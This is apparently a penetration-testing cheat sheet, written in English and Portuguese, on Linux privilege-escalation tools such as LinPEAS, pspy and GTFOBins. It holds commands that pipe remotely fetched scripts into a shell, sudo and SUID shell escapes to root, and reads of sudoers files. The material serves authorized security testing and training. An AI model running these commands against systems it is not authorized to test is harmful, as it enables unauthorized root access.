# Linux Privilege Escalation Tools

## Table of Contents

- [LinPEAS](#linpeas)
- [LinEnum](#linenum)
- [Linux Exploit Suggester](#linux-exploit-suggester)
- [Pspy](#pspy)
- [GTFOBins](#gtfobins)
- [Sudo-Killer](#sudo-killer)

---

## LinPEAS

### Quick Check (One-liner)

```bash
# Quick privesc enumeration
curl -sL https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh
```

> <https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS>

LinPEAS é um script de enumeração de escalonamento de privilégios para sistemas Linux/Unix/MacOS.

### Download

```bash
# Transferir para o alvo
curl http://$lhost/linpeas.sh -o linpeas.sh
chmod +x linpeas.sh
```

### Basic Usage

> Executar todas as verificações

```bash
./linpeas.sh
```

> Saída colorida completa

```bash
./linpeas.sh -a
```

> Sem cores (para salvar em arquivo)

```bash
./linpeas.sh -b
```

### Specific Checks

> Apenas processos e cronjobs

```bash
./linpeas.sh -p
```

> Apenas verificações de rede

```bash
./linpeas.sh -n
```

> Apenas verificações de sistema de arquivos

```bash
./linpeas.sh -f
```

### Output Options

> Salvar saída em arquivo

```bash
./linpeas.sh | tee /tmp/linpeas_output.txt
```

> Executar remotamente sem salvar

```bash
curl -sL http://$lhost/linpeas.sh | bash
```

### Examples

> Enumerar tudo e salvar

```bash
./linpeas.sh -a 2>/dev/null | tee /tmp/linpeas.txt
```

> Verificar apenas sudo e SUID

```bash
./linpeas.sh -s
```

---

## LinEnum

> <https://github.com/rebootuser/LinEnum>

LinEnum é um script de enumeração de escalonamento de privilégios focado em simplicidade.

### LinEnum Basic Usage

> Executar enumeração básica

```bash
./LinEnum.sh
```

> Modo detalhado com exportação

```bash
./LinEnum.sh -t -r report -e /tmp/
```

### Common Checks

> Verificações de sudo

```bash
./LinEnum.sh | grep -i sudo
```

> Verificar SUID/SGID

```bash
./LinEnum.sh | grep -i "suid\|sgid"
```

> Verificar cronjobs

```bash
./LinEnum.sh | grep -i cron
```

### Output Options

> Relatório detalhado

```bash
./LinEnum.sh -t
```

> Exportar relatório

```bash
./LinEnum.sh -r /tmp/linenum_report
```

---

## Linux Exploit Suggester

> <https://github.com/The-Z-Labs/linux-exploit-suggester>

Ferramenta para encontrar vulnerabilidades de escalonamento de privilégios via kernel desatualizado.

### LES Usage

```bash
# Executar verificações do kernel
./linux-exploit-suggester.sh

# Verificar kernel específico
./linux-exploit-suggester.sh --kernel 4.4.0

# Listar exploits disponíveis
./linux-exploit-suggester.sh --full
```

### Specific Options

```bash
# Verificação rápida
./linux-exploit-suggester.sh -g

# Apenas exploits com alta probabilidade
./linux-exploit-suggester.sh --checksec
```

### Output Example

```text
[+] [CVE-2021-4034] PwnKit
   Details: https://www.qualys.com/2022/01/25/cve-2021-4034/pwnkit.txt
   Exposure: probable
   Tags: [ ubuntu=(10|11|12|13|14|15|16|17|18|19|20|21) ],debian=7|8|9|10|11

[+] [CVE-2021-3493] overlayfs
   Details: https://ssd-disclosure.com/ssd-advisory-overlayfs-pe/
   Exposure: probable
   Tags: ubuntu=(14|16|18|20)04
```

---

## Pspy

> <https://github.com/DominicBreuker/pspy>

Pspy monitora processos sem precisar de privilégios de root — útil para capturar cronjobs e scripts executados por root.

### Pspy Basic Usage

> Monitorar processos e sistema de arquivos

```bash
./pspy64
```

> Versão 32-bit

```bash
./pspy32
```

### Options

```bash
# Monitorar apenas processos (sem FS)
./pspy64 -p

# Monitorar apenas sistema de arquivos
./pspy64 -f

# Definir intervalo de polling (ms)
./pspy64 -i 1000

# Modo verboso
./pspy64 -v
```

### Common Workflow

```bash
# Executar e aguardar cronjobs (observar por alguns minutos)
./pspy64 2>/dev/null

# Filtrar apenas processos de root (UID=0)
./pspy64 | grep "UID=0"
```

### Output Example

```text
2024/01/01 12:00:01 CMD: UID=0    PID=1234  | /bin/sh -c /opt/scripts/backup.sh
2024/01/01 12:01:01 CMD: UID=0    PID=1235  | python3 /var/www/maintenance.py
```

---

## GTFOBins

> <https://gtfobins.github.io>

GTFOBins é uma lista de binários Unix que podem ser usados para contornar restrições de segurança locais.

### GTFOBins Usage

> Verificar binários SUID

```bash
find / -perm -u=s -type f 2>/dev/null
```

> Verificar sudo sem senha

```bash
sudo -l
```

### Common Binaries

> Shell via sudo

```bash
# vim
sudo vim -c ':!/bin/bash'

# less
sudo less /etc/passwd
!/bin/bash

# find
sudo find . -exec /bin/bash \;

# awk
sudo awk 'BEGIN {system("/bin/bash")}'

# python
sudo python3 -c 'import os; os.system("/bin/bash")'
```

> Shell via SUID

```bash
# bash (se SUID)
bash -p

# find (se SUID)
./find . -exec /bin/bash -p \;

# vim (se SUID)
./vim -c ':py import os; os.execl("/bin/sh", "sh", "-pc", "reset; exec sh -p")'
```

---

## Sudo-Killer

> <https://github.com/TH3xACE/SUDO_KILLER>

Sudo-Killer identifica misconfigurations e vulnerabilidades no sudo.

### Sudo-Killer Usage

```bash
# Executar verificações completas
./sudo_killer.sh -c -r report.txt -e /tmp/

# Apenas enumerar sudo
./sudo_killer.sh -c

# Com exportação de exploit
./sudo_killer.sh -e /tmp/exploits/
```

### Checks Performed

```bash
# Verificar versão do sudo vulnerável
sudo --version

# Verificar regras sudo
cat /etc/sudoers 2>/dev/null
cat /etc/sudoers.d/* 2>/dev/null

# Verificar variáveis de ambiente
env
```

---

## Quick Reference

### Tool Selection

| Tarefa | Ferramenta |
| :--- | :--- |
| Enumeração geral | LinPEAS |
| Verificação rápida | LinEnum |
| Kernel exploits | Linux Exploit Suggester |
| Monitorar processos root | Pspy |
| Abusar binários sudo/SUID | GTFOBins |
| Misconfigurações sudo | Sudo-Killer |

### Common Workflow

```bash
# 1. Enumeração inicial
./linpeas.sh -a | tee /tmp/linpeas.txt

# 2. Monitorar cronjobs em background
./pspy64 &

# 3. Verificar kernel
./linux-exploit-suggester.sh

# 4. Verificar sudo e SUID
sudo -l
find / -perm -u=s -type f 2>/dev/null

# 5. Consultar GTFOBins para binários encontrados
```

### File Locations

```bash
# Locais para transferir ferramentas
/tmp/
/dev/shm/
/var/tmp/
$HOME/
```

---

## 📚 See Also

### Related Privilege Escalation

- **[Privilege Escalation Linux](Privilege-Escalation-Linux.md)** - Metodologia completa de privesc no Linux
- **[GTFOBins Linux](GTFOBins-Linux.md)** - Abuso de binários nativos do Linux
- **[Linux PrivEsc Tools](Linux-PrivEsc-Tools.md)** - Este arquivo

### Related Topics

- **[Linux Command](../6.OS-Command/6.2.Linux-command.md)** - Comandos de enumeração Linux
- **[Password Attacks](../3.AD-Exploit/3.2.Password-Attacks.md)** - Ataques de credenciais após enumeração
- **[Lateral Movement](../5.Lateral-Movement/5.1.Lateral-Movement.md)** - Movimentação pós-exploração
